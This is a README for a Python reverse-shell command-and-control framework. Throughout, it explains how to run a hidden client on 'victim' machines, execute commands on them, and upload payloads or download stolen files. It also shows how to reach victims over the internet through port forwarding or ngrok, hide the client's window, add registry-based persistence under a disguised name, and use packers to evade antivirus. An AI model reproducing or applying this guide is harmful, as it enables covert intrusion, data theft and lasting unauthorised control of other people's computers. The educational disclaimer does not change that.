# 🧠 Reverse C2 Framework (Silent Client)

> **⚠️ WARNING: This tool is for EDUCATIONAL and AUTHORIZED SECURITY TESTING only.**  
> Unauthorised access is illegal. Use only on networks and devices you own or have explicit written permission to test.

A lightweight, reverse‑shell Command & Control (C2) framework written in Python.  
The **server** runs on your machine and provides an interactive console. The **client** runs silently on the target – it connects back to you, executes commands, and sends output **without displaying anything** to the victim.

---

## ✨ Features

- **Reverse connection** – the client initiates the connection, making firewalls easier to bypass.
- **Silent client** – no console, no prompts, no printed text; perfect for stealth.
- **Multi‑client support** – server handles many victims concurrently via threads.
- **Remote command execution** – run any system command on the victim.
- **File upload/download** – push files to the victim or pull files from it (with size‑prefixed headers for reliability).
- **Heartbeat & timeouts** – keeps connections alive and cleans up dead clients.
- **Stealth deployment** – can be run with `pythonw.exe`, via VBS, or compiled to a windowless `.exe`.
- **Zero‑config defaults** – server listens on `0.0.0.0:4444`; client connects to `127.0.0.1:4444` (for local testing).  
  *Just one change to the client's IP makes it work over the internet.*

---

## 📁 File Structure

```
.
├── server.py          # Operator console – run this on your machine
├── client.py          # Silent agent – runs on the victim's machine
├── silent_start.bat   # (Optional) Launches client with pythonw.exe
├── invisible.vbs      # (Optional) Launches client with no window
└── README.md          # This file
```

---

## 🖥️ Server – Your Command Console

The server listens for incoming connections and gives you an interactive prompt.

### Start the server
```bash
python server.py
```
*By default it binds to `0.0.0.0:4444` – you can change the port inside the code.*

### Available server commands

| Command | Description |
| :------ | :---------- |
| `list` | Show all connected victims with their IDs. |
| `select <id>` | Choose a victim to control (e.g., `select 1`). |
| `<any shell command>` | Runs on the selected victim (e.g., `whoami`, `dir C:\`). |
| `upload <local_file> <remote_path>` | Push a file from your machine to the victim. |
| `download <remote_file> <local_path>` | Pull a file from the victim to your machine. |
| `exit` | Shut down the server. |

**Example session:**
```
C2> list
Connected victims:
  #1 - ('192.168.1.50', 54321)
  #2 - ('10.0.0.5', 12345)

C2> select 1
[*] Now controlling victim #1

C2> whoami
desktop-victim\admin

C2> upload C:\tools\payload.exe C:\Users\Public\payload.exe
[*] Uploaded C:\tools\payload.exe to victim as C:\Users\Public\payload.exe

C2> download C:\secret\data.txt ./stolen_data.txt
[*] Downloaded C:\secret\data.txt from victim to ./stolen_data.txt
```

---

## 🤫 Client – The Silent Agent

The client is designed to run **without any visible feedback** on the victim's machine. It connects to your server and waits for commands.

### Default configuration (local testing)

At the top of `client.py` you'll find:

```python
SERVER_HOST = "127.0.0.1"   # Default: localhost (for testing)
SERVER_PORT = 4444
```

- **For local testing** – just run `python client.py` and it will connect to your local server.
- **For remote deployment** – **change** `SERVER_HOST` to your server's **public IP** (or DNS name) before compiling/distributing.

---

## 🌐 Making It Work Across the Internet

When the victim is **not on the same local network**, you need to make your server reachable. There are two common ways:

### 🅰️ Port Forwarding (Router)

1. **Find your server's local IP** – on Windows, open CMD and type `ipconfig`. Look for `IPv4 Address` (e.g., `192.168.1.10`).

2. **Log into your router** – usually at `192.168.1.1` or `192.168.0.1` (check your router's manual).

3. **Add a port forwarding rule**:
   - **External Port:** `4444` (or any port you choose)
   - **Internal IP:** your server's local IP (e.g., `192.168.1.10`)
   - **Internal Port:** `4444`
   - **Protocol:** `TCP`
   - Save and reboot if necessary.

4. **Allow the port in Windows Firewall**:
   - Open **Windows Defender Firewall** → **Advanced settings** → **Inbound Rules** → **New Rule**.
   - Choose **Port** → `TCP` → Specific local ports: `4444`.
   - Allow the connection → apply to all profiles.
   - Name it (e.g., "C2 Server").

5. **Find your public IP** – Google *"what is my ip"* and copy the address.

6. **Update `client.py`**:
   ```python
   SERVER_HOST = "YOUR_PUBLIC_IP"   # e.g., "123.45.67.89"
   SERVER_PORT = 4444
   ```

7. **Compile and distribute** the client – it will now connect to your home server from anywhere.

---

### 🅱️ Ngrok (No Port Forwarding Required)

If you can't port forward (e.g., you're on campus Wi-Fi or mobile data), use **ngrok** to tunnel traffic.

1. **Download ngrok** from [ngrok.com](https://ngrok.com) and unzip it.

2. **Start your server** locally:
   ```bash
   python server.py
   ```

3. **Expose it with ngrok**:
   ```bash
   ngrok tcp 4444
   ```
   You'll see something like:
   ```
   Forwarding  tcp://0.tcp.ngrok.io:12345 -> localhost:4444
   ```

4. **Update `client.py`**:
   ```python
   SERVER_HOST = "0.tcp.ngrok.io"
   SERVER_PORT = 12345
   ```

5. **Compile and distribute** – the client will connect through ngrok to your local server. No router changes needed.

> 💡 *Ngrok free tier gives you a random subdomain; for a static address you can upgrade to a paid plan or use a dynamic DNS service.*

---

## 🕵️ Making the Client Invisible (Stealth Execution)

Because the victim should never see a terminal window, use one of these methods:

### Method 1: `pythonw.exe` + Batch File
`pythonw.exe` runs Python **without a console window**. Create `silent_start.bat`:

```batch
@echo off
start /B pythonw.exe client.py
exit
```
- Double‑clicking this `.bat` will launch the client with no visible window.

### Method 2: VBS Script (No Flashes)
Create `invisible.vbs`:

```vbs
CreateObject("WScript.Shell").Run "pythonw.exe client.py", 0, False
```
The `0` hides the window completely – even the batch flash is avoided.

### Method 3: Compile to `.exe` (Recommended)
This packages the client into a single `.exe` that **does not require Python** on the target.

1. Install PyInstaller:
   ```bash
   pip install pyinstaller
   ```
2. Build the `.exe` with no console:
   ```bash
   pyinstaller --onefile --noconsole client.py
   ```
3. Find `client.exe` in the `dist` folder.  
   The victim double‑clicks it – no window, no prompts, just a silent connection.

---

## 🔁 Optional: Persistence (Run on Boot)

To survive reboots, add the client to Windows startup:

### Registry Method
```cmd
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "SysHelper" /t REG_SZ /d "C:\path\to\client.exe" /f
```

### Startup Folder
Place the `.exe` (or `.bat`/`.vbs`) in:
```
C:\Users\<victim>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
```

---

## 🛡️ Limitations & Security Warnings

- **No encryption** – everything is plaintext. Add TLS if you need secrecy.
- **No authentication** – anyone who reaches your server port can connect.
- **Shell injection** – the client uses `shell=True` – only in labs.
- **Antivirus** – compiled `.exe`s may be flagged; this is normal for C2 tools.

---

## ❓ Troubleshooting

| Problem | Solution |
| :------ | :------- |
| `ConnectionRefusedError` | Server not running, wrong IP/port, or firewall blocking. |
| Client connects but no commands work | Check that you `select` a victim first (`select 1`). |
| Client won't connect over the internet | Verify port forwarding or ngrok tunnel is active. Use an online port checker to test. |
| `python` not found in batch | Use `py` instead of `python`, or provide full path to `python.exe`. |
| `.exe` flagged by AV | This is typical. You can use obfuscation or packers, or accept the warning. |

---

## 📜 License & Disclaimer

MIT License – for **educational purposes only**.  
The author does not condone illegal use and assumes no liability.

---

*Stay ethical, stay legal, and only test what you own or have permission to test.* 🔐
